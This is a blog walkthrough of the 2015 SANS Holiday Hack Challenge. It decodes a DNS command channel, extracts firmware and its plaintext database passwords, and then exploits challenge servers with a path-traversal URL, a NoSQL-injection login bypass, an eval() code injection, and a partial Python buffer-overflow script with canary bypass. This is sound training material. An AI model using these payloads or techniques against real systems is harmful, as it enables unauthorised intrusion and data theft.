---
layout: post
published: true
title: "SANS Holiday Hack 2015: Solutions & Answers"
tags: ctf,walkthrough
category: ctf
excerpt: "Technical solutions for the SANS Holiday Hack 2015, covering packet capture analysis, Local File Inclusion, NoSQL Injection, Remote Code Execution, binary exploitation & exploit development on Linux with gdb, bypassing canary and ASLR protection."
#excerpt: "Covers packet capture analysis, Local File Inclusion, NoSQL Injection, Remote Code Execution & binary exploit development on Linux with gdb, bypassing canary and ASLR protection."
image:
  feature: 2016-01-sans/banner2.png
---
[img1]: /images/2016-01-sans/
{: height="50%" width="50%"}

## Table of Contents


1. [Summary](#summary)
2. [Part 1: Curious Wireless Packets](#part1)
3. [Part 2: Firmware Analysis for Fun and Profit](#part2)
4. [Part 3: Internet-Wide Scavenger Hunt](#part3)
5. [Part 4: Gnomage Pwnage](#part4)
6. [SuperGnome 1: 52.2.229.189](#sg1)
7. [SuperGnome 2: 52.34.3.80 (Local File Inclusion)](#sg2)
8. [SuperGnome 3: 52.64.191.71 (NoSQL Injection)](#sg3)
9. [SuperGnome 4: 52.192.152.132 (Remote Code Execution)](#sg4)
10. [SuperGnome 5: 54.233.105.81 (Buffer Overflow)](#sg5)
11. [Part 5: Sinister Plot and Attribution](#part5)



## <a id="summary"></a>1. Summary

This post covers my technical solutions for the [2015 SANS Holiday Hack Challenge](https://www.holidayhackchallenge.org/index.html). Background, storyline and questions/challenges can be found at <https://www.holidayhackchallenge.org/index.html#story>. 

## <a id="part1"></a>2. Part 1: Curious Wireless Packets

#### Question 1: Which commands are sent across the Gnome’s command-and-control channel?

After downloading the pcap file at <https://www.holidayhackchallenge.com/2015/giyh-capture.pcap> and viewing it with Wireshark, a suspicious amount of even more suspicious looking DNS responses was found. These DNS TXT responses contained base64 encoded strings:

<figure>
	<a href="/images/2016-01-sans/1-wireshark.png"><img src="/images/2016-01-sans/1-wireshark.png"></a>
</figure>

After manually decoding a few of those strings, it became obvious that DNS queries and responses had been used as a Command & Control channel.

Participants were apparently expected to use Scapy to decode all commands, but due to their format I found it quicker to run tshark on the pcap file ...

    tshark -V -r giyh-capture.pcap -T fields -e dns.txt | grep -E '.' > extracted.txt

... and then decode the results with a simple Python script:

{% highlight python %}
#!/usr/bin/python

import base64

f = open('extracted.txt')
l = f.readlines()
f.close()

lno = 0

for s in l:
	lno = lno+1
	d = base64.b64decode(s)
	print str(lno)+': '+d.strip()
{% endhighlight %}


The result was a text file containing all commands and responses in decoded form, followed by some binary data:

<figure>
	<a href="/images/2016-01-sans/1-terminal.png"><img src="/images/2016-01-sans/1-terminal.png"></a>
	<figcaption>JFIF looks promising.</figcaption>
</figure>

With the question asking for the sent commands, the answer is:

```
EXEC:iwconfig
->
EXEC:START_STATE
...
EXEC:STOP_STATE

EXEC:cat /tmp/iwlistscan.txt
->
EXEC:START_STATE
...
EXEC:STOP_STATE

FILE:/root/Pictures/snapshot_CURRENT.jpg
-> 
FILE:START_STATE,NAME=/root/Pictures/snapshot_CURRENT.jpg
...
FILE:STOP_STATE
```

<figure>
	<a href="/images/2016-01-sans/tim-tips.png"><img src="/images/2016-01-sans/tim-tips.png"></a>
	<figcaption>My avatar's facial expression seemed fitting while pondering whether to use Burp, strings, Scapy, rdpcap() and prn, or to stick with tshark and nine lines of Python.</figcaption>
</figure>


#### Question 2: What image appears in the photo the Gnome sent across the channel from the Dosis home?

I had the Python script output line numbers for a reason: to determine the lines containing binary data. After copying these lines into a new file ("extracted-imgonly.txt"), the required photo could be extracted by running the following command:

    cat extracted-imgonly.txt | base64 -d | sed 's/FILE://g' > photo.jpg

<figure>
	<a href="/images/2016-01-sans/snapshot_CURRENT.jpg"><img src="/images/2016-01-sans/snapshot_CURRENT.jpg"></a>
</figure>

## <a id="part2"></a>3. Part 2: Firmware Analysis for Fun and Profit

#### Question 3: What operating system and CPU type are used in the Gnome?  What type of web framework is the Gnome web interface built in?





In the firmware file downloaded from <https://www.holidayhackchallenge.com/2015/giyh-firmware-dump.bin>, binwalk detected a SquashFS filesystem...

```
# binwalk giyh-firmware-dump.bin 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PEM certificate
1809          0x711           ELF 32-bit LSB shared object, ARM, version 1 (SYSV)
168803        0x29363         Squashfs filesystem, little endian, version 4.0, compression:gzip, size: 17376149 bytes,  4866 inodes, blocksize: 131072 bytes, created: Tue Dec  8 19:47:32 2015
```

... which was subsequently extracted:

```
# binwalk -e giyh-firmware-dump.bin
```

As I was using Kali 2.0, I installed ```firmware-mod-kit``` to first get some information about the filesystem...

```
# apt-get install firmware-mod-kit

# cd /opt/firmware-mod-kit/trunk/src/others/squashfs-4.0-lzma/

# ./unsquashfs-lzma -s /root/sans/2/_giyh-firmware-dump.bin.extracted/29363.squashfs 
Found a valid SQUASHFS 4:0 superblock on /root/sans/2/_giyh-firmware-dump.bin.extracted/29363.squashfs.
Creation or last append time Tue Dec  8 19:47:32 2015
Filesystem is exportable via NFS
Inodes are compressed
Data is compressed
[...]
```

...and then extract its contents:

```
# ./unsquashfs-lzma -i /root/sans/2/_giyh-firmware-dump.bin.extracted/29363.squashfs 
Parallel unsquashfs: Using 1 processor
3936 inodes (5763 blocks) to write

squashfs-root
squashfs-root/bin
squashfs-root/bin/ash
squashfs-root/bin/board_detect
[...]

Parallel unsquashfs: Using 1 processor
3936 inodes (5763 blocks) to write
```

At this point, a directory containing the filesystem's contents - files and directories - had been created. Some of these files allowed to answer the questions regarding the OS (Linux/OpenWrt) ...

```
# cat ./squashfs-root/etc/device_info
DEVICE_MANUFACTURER='OpenWrt'
DEVICE_MANUFACTURER_URL='http://www.openwrt.org/'
DEVICE_PRODUCT='Generic'
DEVICE_REVISION='v0'
```

... the CPU type (ARM) ...

```
# file ./squashfs-root/bin/sh
./squashfs-root/bin/sh: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-armhf.so.1, stripped
```

... and the used web framework (Node.js):

```
# cat ./squashfs-root/www/bin/www 
#!/usr/bin/env node
[...]
```

#### Question 4: What kind of a database engine is used to support the Gnome web interface? What is the plaintext password stored in the Gnome database?

The database engine appeared to be MongoDB:

```
# cat ./squashfs-root/www/app.js
[...]
var mongo = require('mongodb');
var monk = require('monk');
var db = monk('gnome:KTt9C1SljNKDiobKKro926frc@localhost:27017/gnome')
[...]
```

Indeed, ```/opt/mongodb``` contained files that appeared to hold a MongoDB database. To answer the question about the plaintext password, MongoDB was installed and started on the local Kali 2 system, and the database ransacked / carefully analyzed:

```
# apt-get install mongodb
# mongod
[...]
*********************************************************************
 ERROR: dbpath (/data/db/) does not exist.
 Create this directory or give existing directory in --dbpath.
 See http://dochub.mongodb.org/core/startingandstoppingmongo
*********************************************************************
[...]
# mongod --dbpath=opt/mongodb
> show dbs
gnome	0.078125GB
local	0.078125GB
> db.getCollectionNames()
[ "cameras", "settings", "status", "system.indexes", "users" ]
> db.cameras.find()
{ "_id" : ObjectId("56225c994a37f7d48337b9be"), "cameraid" : 1, "tz" : -5, "status" : "online" }
[...]
> db.settings.find()
{ "_id" : ObjectId("562269a1b6e8d3a99a07300c"), "setting" : "Current config file:", "value" : "./tmp/e31faee/cfg/sg.01.v1339.cfg" }
[...]
> db.status.find()
{ "_id" : ObjectId("56421153b0aa2a3be47a2d04"), "sg-avail" : 5, "sg-up" : 5, "gnomes-avail" : 1733315, "gnomes-up" : 1653325, "backbone" : "UP", "storage" : 1353235, "memory" : 835325, "last-update" : 1447170332 }
[...]
> db.system.indexes.find()
{ "v" : 1, "name" : "_id_", "key" : { "_id" : 1 }, "ns" : "gnome.cameras" }
[...]
> db.users.find()
{ "_id" : ObjectId("56229f58809473d11033515b"), "username" : "user", "password" : "user", "user_level" : 10 }
{ "_id" : ObjectId("56229f63809473d11033515c"), "username" : "admin", "password" : "SittingOnAShelf", "user_level" : 100 }
```

As can be seen in the last two lines, there were actually *two* plaintext passwords stored in the Gnome database: "**user**" and "**SittingOnAShelf**".



## <a id="part3"></a>4. Part 3: Internet-Wide Scavenger Hunt


#### Question 5: What are the IP addresses of the five SuperGnomes scattered around the world, as verified by Tom Hessman in the Dosis neighborhood?

The hosts file of the extracted filesystem, ```/etc/hosts```, contained information pointing to the first SuperGnome:

```
# cat ./squashfs-root/etc/hosts:
[...]
# LOUISE: NorthAmerica build
52.2.229.189    supergnome1.atnascorp.com sg1.atnascorp.com supergnome.atnascorp.com sg.atnascorp.com
```

Although it was possible to access a SuperGnome web page simply by opening <http://52.2.229.189>, I wondered whether the server was supposed to be accessed with one of the hostnames from the hosts file (```supergnome1.atnascorp.com```, ```sg1.atnascorp.com```, ```supergnome.atnascorp.com```, ```sg.atnascorp.com```). I added that entry to my own hosts file so I could access the server via http://supergnome1.atnascorp.com, http://sg1.atnascorp.com, http://supergnome.atnascorp.com and http://sg.atnascorp.com, just to verify that the server would not serve different content based on my web browser sending the correct "Host:" header:

```
# cat >> /etc/hosts
52.2.229.189    supergnome1.atnascorp.com sg1.atnascorp.com supergnome.atnascorp.com sg.atnascorp.com
```

Didn't make a difference though.

Anyway, the first SuperGnome was known. In order to find the other four, I looked for something that the first SuperGnome might have in common with the others, such as an HTTP header:

<figure>
	<a href="/images/2016-01-sans/3-iceweasel-header.png"><img src="/images/2016-01-sans/3-iceweasel-header.png"></a>
	<figcaption>"X-Powered-By" roughly translates to "vulnerable to something".</figcaption>
</figure>

"**X-Powered-By: GIYH::SuperGnome by AtnasCorp**" looked like a sufficiently unique header/value pair, but searching Shodan for "supergnome" was enough to reveal the IP addresses of the remaining SuperGnomes: <https://www.shodan.io/search?query=supergnome>. 

To summarize (and answer question 5), their IP addresses are:

* 52.2.229.189
* 52.34.3.80
* 52.64.191.71
* 52.192.152.132
* 54.233.105.81

<figure>
	<a href="/images/2016-01-sans/3-shodan2.png"><img src="/images/2016-01-sans/3-shodan2.png"></a>
	<figcaption>No DoS. It's Christmas, after all.</figcaption>
</figure>

#### Question 6: Where is each SuperGnome located geographically?

Based on what Shodan is telling us, their locations are:

```
52.192.152.132
City		Tokyo
Country		Japan

54.233.105.81
Country		Brazil

52.34.3.80
City		Boardman
Country		United States

52.64.191.71
City		Sydney
Country 	Australia

52.2.229.189
City		Ashburn
Country		United States
```

<figure>
	<a href="/images/2016-01-sans/3-shodan-loc.png"><img src="/images/2016-01-sans/3-shodan-loc.png"></a>
	<figcaption>For some reason, AtnasCorp decided to stay out of EMEA. Probably tax related.</figcaption>
</figure>

## <a id="part4"></a>5. Part 4: Gnomage Pwnage

#### Question 7: Please describe the vulnerabilities you discovered in the Gnome firmware.

See below.

#### Question 8: [A]ttempt to remotely exploit each of the SuperGnomes.  Describe the technique you used to gain access to each SuperGnome’s gnome.conf file.

See below.

## <a id="sg1"></a>6. SuperGnome 1: 52.2.229.189

The first SuperGnome server, SG-1, was running a web server at <http://52.2.229.189/>. The web page asked for credentials and the previously discovered ones, ```admin:SittingOnAShelf```, were accepted. Once logged in, the "Files" page at <http://52.2.229.189/files> allowed for the download of various files, including the "gnome.conf" file via <http://52.2.229.189/files?d=gnome.conf>:

```
Gnome Serial Number: NCC1701
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-01
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

## <a id="sg2"></a>7. SuperGnome 2: 52.34.3.80 (Local File Inclusion)

SG-2 (52.34.3.80) appeared similar to SG-1: just like SG-1, it was running a web server at <http://52.34.3.80/>.

However, unlike SG-1, the "Files" page <http://52.34.3.80/files> denied access to the listed files ("Downloading disabled by Super-Gnome administrator."). A vulnerability had to be found and exploited in order to read the gnome.conf file.

The "Cameras" page at <http://52.34.3.80/cameras> displayed a number of image files, with their URL following the form of <http://52.34.3.80/cam?camera=[id]>, with [id] representing a number from 1 to 6. Replacing this number with a string unlikely to correspond to an existing camera identifier provoked an error message:

<figure>
	<a href="/images/2016-01-sans/sg2a.png"><img src="/images/2016-01-sans/sg2a.png"></a>
</figure>

This error message indicated that the web application was internally trying to access a file path based on the used-supplied value of the "camera" parameter, with the ".png" extension added. This appeared to be a possible venue towards a Local File Inclusion (LFI) vulnerability. 

The source code of the application had been found during the previously mentioned firmware extraction ("/www/routes/index.js") and was now examined to better understand how the application was building file paths to display images on the "Cameras" page:

{% highlight javascript %}
(Source file: /www/routes/index.js:182)

// CAMERA VIEWER
// STUART: Note: to limit disclosure issues, this code checks to make sure the user asked for a .png file
router.get('/cam', function(req, res, next) {
  var camera = unescape(req.query.camera);
  // check for .png
  //if (camera.indexOf('.png') == -1) // STUART: Removing this...I think this is a better solution... right?
  camera = camera + '.png'; // add .png if its not found
  console.log("Cam:" + camera);
  fs.access('./public/images/' + camera, fs.F_OK | fs.R_OK, function(e) {
    if (e) {
	    res.end('File ./public/images/' + camera + ' does not exist or access denied!');
    }
  });
  fs.readFile('./public/images/' + camera, function (e, data) {
    res.end(data);
  });
});
{% endhighlight %}

As can be seen just below the "check for .png" comment, the application would simply append ".png" to any user-supplied file name. This was probably done in an attempt to mitigate the LFI issue by preventing the loading of files with an extension other than ".png". However, the commented out code

{% highlight javascript %}
//if (camera.indexOf('.png') == -1)
{% endhighlight %}

suggested that an earlier version of the application would only append ".png" if the string had not already contained a ".png" substring at any location. This means that while the application would change "ABC" to "ABC.png" and keep "ABC.png" unchanged, "A.pngBC" would also remain unaltered and, as such, without the ".png" extension. And SG-2 just happened to be running this older version.

To exploit the LFI vulnerability, the "camera" parameter had to be passed a string that would cause the application to open the ```/gnome/www/files/gnome.conf``` file, but also contain the ".png" string in order to avoid having a ".png" extension appended to the file path. 
If ".png" was to be part of the file *path*, but not part of the file *name*, it would have to be part of a directory name - "a.png" in the following examples:

```
http://52.34.3.80/cam?camera=../a.png/../../../../../../../../gnome/www/files/gnome.conf
```

However, this would cause an error because the "a.png" directory did not exist at that location on the target's file system:

```
File ./public/images/../a.png/../../../../../../../../gnome/www/files/gnome.conf does not exist or access denied!
```

The necessity for an existing directory with a name containing ".png" complicated things a little, as such a directory would have to be created on the target's file system, and in a known location.

Fortunately, the "Settings" page at <http://52.34.3.80/settings> allowed for the upload of files with a user-specified file name, including a directory name. Entering the file name ```a.png/z.png``` ...

<figure>
	<a href="/images/2016-01-sans/Selection_020.png"><img src="/images/2016-01-sans/Selection_020.png"></a>
</figure>

... would cause an error message ...

<figure>
	<a href="/images/2016-01-sans/Selection_019.png"><img src="/images/2016-01-sans/Selection_019.png"></a>
</figure>

but at this point, the directory ```a.png``` had already been created.

With the ```a.png``` directory being present and its location known thanks to the above error message, the path to the ```gnome.conf``` file could be stitched together as follows:

```
http://52.34.3.80/cam?camera=../upload/dCoIbrlu/a.png/../../../../../../gnome/www/files/gnome.conf
```

Result:

```
Gnome Serial Number: XKCD988
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-02
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```

The other files listed on the "Files" page at <http://52.34.3.80/files> were downloaded the same way. 


## <a id="sg3"></a>8. SuperGnome 3: 52.64.191.71 (NoSQL Injection)

While also running a web server at <http://52.64.191.71>, SG-3 (52.64.191.71) differed from the previous SuperGnomes: it did not accept the ```admin:SittingOnAShelf``` credentials ("Invalid username or password!"). 

In order to gain access to the administrative interface anyway, the unsuccessful HTTP login request was first captured with Burp Suite. 

Then, looking at the source code behind the authentication logic, a vulnerability was discovered:

{% highlight javascript %}
(Source file: /www/routes/index.js:105)

// LOGIN POST
router.post('/', function(req, res, next) {
  var db = req.db;
  var msgs = [];
  db.get('users').findOne({username: req.body.username, password: req.body.password}, function (err, user) { // STUART: Removed this in favor of below.  Really guys?
  //db.get('users').findOne({username: (req.body.username || "").toString(10), password: (req.body.password || "").toString(10)}, function (err, user) { // LOUISE: allow passwords longer than 10 chars
    if (err || !user) {
      console.log('Invalid username and password: ' + req.body.username + '/' + req.body.password);
      msgs.push('Invalid username or password!');
      res.msgs = msgs;
      res.render('index', { title: 'GIYH::ADMIN PORT V.01', session: sessions[req.cookies.sessionid], res: res });
    } else {
      sessionid = gen_session();
      sessions[sessionid] = { username: user.username, logged_in: true, user_level: user.user_level };
      console.log("User level:" + user.user_level);
      res.cookie('sessionid', sessionid);
      res.writeHead(301,{ Location: '/' });
      res.end();
    }
  });
});
{% endhighlight %}

The application was passing the user-supplied values of the "username" and "password" parameters to the database without sanitizing them first, which resulted in an injection vulnerability. In order to exploit the issue, the MongoDB found within the extracted firmware was used as a testing environment:

<figure>
	<a href="/images/2016-01-sans/mongo_021.png"><img src="/images/2016-01-sans/mongo_021.png"></a>
</figure>

Back in Burp Suite, a modified version of the previously captured login request was sent, resulting in the server sending cookie containing a ```sessionid``` associated with administrative privileges:

<figure>
	<a href="/images/2016-01-sans/Selection_014.png"><img src="/images/2016-01-sans/Selection_014.png"></a>
</figure>

This ```sessionid``` was used to replaced the ```sessionid``` of a legitimate cookie stored in the attacking system's web browser. The screenshot below shows how the ```sessionid``` replacement was done using the [Cookie Manager+](https://addons.mozilla.org/en-US/firefox/addon/cookies-manager-plus/) extension for Firefox/Iceweasel):

<figure>
	<a href="/images/2016-01-sans/Selection_015.png"><img src="/images/2016-01-sans/Selection_015.png"></a>
</figure>

After the following reload of the web page, SG-3 welcomed "admin to the GIYH Administrative Portal", and the "Files" page at <http://52.64.191.71/files> granted access to multiple files, including ```gnome.conf```:

```
Gnome Serial Number: THX1138
Current config file: ./tmp/e31faee/cfg/sg.01.v1339.cfg
Allow new subordinates?: YES
Camera monitoring?: YES
Audio monitoring?: YES
Camera update rate: 60min
Gnome mode: SuperGnome
Gnome name: SG-03
Allow file uploads?: YES
Allowed file formats: .png
Allowed file size: 512kb
Files directory: /gnome/www/files/
```



## <a id="sg4"></a>9. SuperGnome 4: 52.192.152.132 (Remote Code Execution)

Just like the other SuperGnomes, SG-4 (52.192.152.132) was running a web server at <http://52.192.152.132/>. 

The "Files" page at <http://52.192.152.132/files> did not allow for the download of the listed files. Unlike the "Files" pages on the previously encountered SuperGnomes, it contained a "Upload New File" form. 

Looking at the source code behind this upload functionality, it was discovered that it made use of the ```eval()``` function:

{% highlight javascript %}
(Source file: /www/routes/index.js:153)

// FILES UPLOAD
router.post('/files', upload.single('file'), function(req, res, next) {
  if (sessions[sessionid].logged_in === true && sessions[sessionid].user_level > 99) { // NEDFORD: this should be 99 not 100 so admins can upload
    var msgs = [];
    file = req.file.buffer;
    if (req.file.mimetype === 'image/png') {
      msgs.push('Upload successful.');
      var postproc_syntax = req.body.postproc;
      console.log("File upload syntax:" + postproc_syntax);
      if (postproc_syntax != 'none' && postproc_syntax !== undefined) {
        msgs.push('Executing post process...');
        var result;
        d.run(function() {
          result = eval('(' + postproc_syntax + ')');
        });
[...]
{% endhighlight %}

As can be seen above, the parameter passed to the ```eval()``` function originates directly from the value of a ```postproc``` parameter, with the latter being part of the HTTP request that submitted the "Upload New File" form. However, in order to reach the line calling ```eval()```, the ```Content-Type``` of the uploaded file had to be ```image/png```. 

The "Upload New File" form was submitted and the resulting HTTP-POST captured and modified with Burp Suite. At first, the exploitability of the remote code execution vulnerability was verified:

<figure>
	<a href="/images/2016-01-sans/sg4-burp1.png"><img src="/images/2016-01-sans/sg4-burp1.png"></a>
</figure>

Then the ```gnome.conf``` file was read:

<figure>
	<a href="/images/2016-01-sans/sg4-burp2.png"><img src="/images/2016-01-sans/sg4-burp2.png"></a>
</figure>

Some of the other files listed on the "Files" page were not simple text files like ```gnome.conf```, but binary files that were cumbersome to process when accessed directly:

<figure>
	<a href="/images/2016-01-sans/sg4-burp3.png"><img src="/images/2016-01-sans/sg4-burp3.png"></a>
</figure>

Thus, the application was made to read and then encode them as base64:

<figure>
	<a href="/images/2016-01-sans/sg4-burp4.png"><img src="/images/2016-01-sans/sg4-burp4.png"></a>
</figure>

The resulting string could simply be saved to a local text file and then decoded to produce the original file ("20151203133815.zip" in the example below). This process was repeated for all available files:

<figure>
	<a href="/images/2016-01-sans/Terminal_026.png"><img src="/images/2016-01-sans/Terminal_026.png"></a>
	<figcaption></figcaption>
</figure>



## <a id="sg5"></a>10. SuperGnome 5: 54.233.105.81 (Buffer Overflow)

An nmap scan of SG-5 (54.233.105.81) revealed port 4242/tcp to be open:

```
# nmap -sS -Pn -p- 54.233.105.81 -vv
Initiating SYN Stealth Scan at 17:30
Scanning ec2-54-233-105-81.sa-east-1.compute.amazonaws.com (54.233.105.81) [65535 ports]
Discovered open port 80/tcp on 54.233.105.81
Discovered open port 4242/tcp on 54.233.105.81
[...]
PORT     STATE  SERVICE        REASON
80/tcp   open   http           syn-ack ttl 45
4242/tcp open   vrml-multi-use syn-ack ttl 45
5555/tcp closed freeciv        reset ttl 45
```

After connecting to this port with telnet, the server responded with a text-based menu:

```
# telnet 54.233.105.81 4242
Trying 54.233.105.81...
Connected to 54.233.105.81.
Escape character is '^]'.

Welcome to the SuperGnome Server Status Center!
Please enter one of the following options:

1 - Analyze hard disk usage
2 - List open TCP sockets
3 - Check logged in users
```

While the previously extracted firmware had contained the source code of the vulnerable Node.js application of other SuperGnomes, source code relating to the "SuperGnome Server Status Center" could not be found. However, while searching for such source code, an executable binary file was discovered:

```
# grep -r 'SuperGnome Server Status Center' ./squashfs-root/
Binary file ./squashfs-root/usr/bin/sgstatd matches
[...]
```

Previous SuperGnomes had held a ZIP file named ```sgnet.zip```, and they had certainly contained files related to the above ```sgstatd``` binary:

```
# unzip sgnet.zip 
Archive:  sgnet.zip
  inflating: sgnet.c                 
  inflating: sgnet.h                 
  inflating: sgstatd.c               
  inflating: sgstatd.h  
# grep 'SuperGnome Server Status Center' *.*
sgstatd.c:		write(sd, "\nWelcome to the SuperGnome Server Status Center!\n", 51);
```

With the source code of the SuperGnome Server Status Center present, their contents revealed an undocumented option:

{% highlight c %}
(Source file: sgstatd.c:21)

write(sd, "\nWelcome to the SuperGnome Server Status Center!\n", 51);
		write(sd, "Please enter one of the following options:\n\n", 45);
		write(sd, "1 - Analyze hard disk usage\n", 28);
		write(sd, "2 - List open TCP sockets\n", 26);
		write(sd, "3 - Check logged in users\n", 27);
		fflush(stdout);

		recv(sd, &choice, 1, 0);

		switch (choice) {
		case 49:
[...]

		case 50:
[...]

		case 51:
[...]

		case 88:
[...]
			write(sd, "Enter a short message to share with GnomeNet (please allow 10 seconds) => ", 75);
			fflush(stdin);
			sgstatd(sd);
[...]
{% endhighlight %}

While the "SuperGnome Server Status Center" did a reasonable job at describing the purpose of the first three options (49=1, 50=2, 51=3), the last option (88=X) was not mentioned at all. It turned out to be a hidden feature that would allow the client to send a short message to the server. First the message string would be processed by ```sgstatd()``` though:

{% highlight c %}
(Source file: sgstatd.c:138)

int sgstatd(sd)
{
	__asm__("movl $0xe4ffffe4, -4(%ebp)");
	//Canary pushed

	char bin[100];
	write(sd, "\nThis function is protected!\n", 30);
	fflush(stdin);
	//recv(sd, &bin, 200, 0);
	sgnet_readn(sd, &bin, 200);
	__asm__("movl -4(%ebp), %edx\n\t" "xor $0xe4ffffe4, %edx\n\t"	// Canary checked
		"jne sgnet_exit");
	return 0;

}
{% endhighlight %}

```sgnet_readn()``` would then save the first 200 characters of the message in the variable ```bin```, which, given its declaration as ```char bin[100]```, might not have been assigned enough memory to hold the entire message. 

In order to exploit the resulting (buffer overflow) vulnerability, the type of the ```sgstatd``` binary was determined:

```
# file ./squashfs-root/usr/bin/sgstatd
./squashfs-root/usr/bin/sgstatd: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=72df753907e54335d83b9e1c3ab00ae402ad812f, not stripped
```

The sgstatd binary was then transferred to and run on a 32-bit Kali (1) VM (below referred to as "Server VM"), with DEP/NX disabled as described at <https://gist.github.com/joswr1ght/a45d000ceaccf4cce6cb>:

<figure>
	<a href="/images/2016-01-sans/1.png"><img src="/images/2016-01-sans/1.png"></a>
	<figcaption>Press Esc... </figcaption>
</figure>


<figure>
	<a href="/images/2016-01-sans/2n.png"><img src="/images/2016-01-sans/2n.png"></a>
	<figcaption>...and type "live-686-pae noexec=off noexec32=off"</figcaption>
</figure>


<figure>
	<a href="/images/2016-01-sans/3n.png"><img src="/images/2016-01-sans/3n.png"></a>
	<figcaption>Success!</figcaption>
</figure>


To get an initial understanding of how the program would behave, the ```sgstatd``` server was started on the Server VM. After a connection had been established from the attacking system to the Server VM, a message, consisting of 200 "A" characters, was sent:

<figure>
	<a href="/images/2016-01-sans/Terminal_028.png"><img src="/images/2016-01-sans/Terminal_028.png"></a>
	<figcaption>A common first step of exploit development is to yell at the targeted binary.</figcaption>
</figure>

As a result, ```sgstatd``` displayed a "Canary not repaired" message. This suggested that the "A" message had overwritten the stack canary, which, judging by  the source of the ```sgstatd()``` function above, appeared to be ```e4ffffe4```. Had the message contained these bytes at the correct position, it would have been possible to bypass the canary check. 

At this point, it became clear that the communication with the sgstatd server should no longer be done manually through telnet, and a basic Python script ("xpl.py") was developed:

{% highlight python %}
#!/usr/bin/python

import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect(('192.168.1.204', 4242))  # Server VM
#    s.connect(('54.233.105.81', 4242))  # SG-5

    response = s.recv(1024)
    print response
    time.sleep(1)
    response = s.recv(1024)
    print response
    print '---'
    
    time.sleep(1)
	
    response = ''
    print "SENDING X"
    s.send('X')  # Triggering hidden function
    s.send('\n')
    while (len(response) &gt; 50 and response[-2:] != '\n\n'):
        print 'waiting for full response'
        time.sleep(1)
        response = response + s.recv(1024)
    print response
    
    # Constructing the message
    msg = 'A' * 200

    print "SENDING msg"
    time.sleep(1)
    s.send(msg)
    s.send('\n')
    print "SENT msg"

    s.close()
    print '\n\nDONE'
    
except:
    print 'except'
{% endhighlight %}

In order to determine where the canary value bytes would have to be placed within the message, the ```sgstatd``` program was run with ```gdb```. The first step would be to find the location of the canary value *prior* to any memory manipulation having taken place. To do so, a suitable breakpoint had to be identified, and I chose one just before the message would be processed by ```sgnet_readn()```:

<figure>
	<a href="/images/2016-01-sans/4n.png"><img src="/images/2016-01-sans/4n.png"></a>
</figure>

```xpl.py``` was started on the attacking system, and when the breakpoint was reached, I searched the memory for the four bytes representing the canary value. They were located at ```0xBFFFF064```:

<figure>
	<a href="/images/2016-01-sans/5n.png"><img src="/images/2016-01-sans/5n.png"></a>
</figure>

The next step was to figure out which part of the 200 character long message would be placed at this memory location. A 200 character long pattern was created on the attacking system:

```
# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

On the Server VM, gdb/sgstatd were restarted and this time, the breakpoint was set *after* the message processing:

<figure>
	<a href="/images/2016-01-sans/6n.png"><img src="/images/2016-01-sans/6n.png"></a>
</figure>

```xpl.py``` was modified to send the pattern instead of the 200 "A" characters and run. When the breakpoint had been reached, the memory location ```0xBFFFF064``` (where the canary value used to be stored) was examined and found to have been overwritten with ```64413464```:

<figure>
	<a href="/images/2016-01-sans/7n.png"><img src="/images/2016-01-sans/7n.png"></a>
	<figcaption></figcaption>
</figure>

To correlate this value with a location within the sent message, ```pattern_offset.rb``` was used:

```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 64413464
[*] Exact match at offset 103
```

Having learned that the characters relating to memory location ```0xBFFFF064`` were starting at position 104 of the message, the ```msg``` variable inside ```xpl.py``` was modified to write the correct canary value at the hopefully correct location:

{% highlight python %}
    msg = 'A' * 103
    msg += '\xe4\xff\xff\xe4' # Canary
    msg += 'D' * 93
{% endhighlight %}

When this version of ```xpl.py``` was run against the server, the "Canary not repaired" message did not appear. Instead, ```sgstatd``` crashed and gdb printed an error message suggesting that EIP had been overwritten with four of the 93 "D" characters, each represented by a ```44``` byte below:

<figure>
	<a href="/images/2016-01-sans/9n.png"><img src="/images/2016-01-sans/9n.png"></a>
</figure>

To determine which "D" characters would control EIP, they were replaced with the previously mentioned pattern:

{% highlight python %}
    pattern200 = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'

    msg = 'A' * 103
    msg += '\xe4\xff\xff\xe4' # Canary
    msg += pattern200 # previously:'D' * 93
{% endhighlight %}

This time, EIP had been set to ```61413161``` ...

<figure>
	<a href="/images/2016-01-sans/10n.png"><img src="/images/2016-01-sans/10n.png"></a>
</figure>

... corresponding to offset 4 within the pattern:

```
# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb 61413161
[*] Exact match at offset 4
```

Similarly, EBP had been set to ```41306141```, which translated to offset 0.

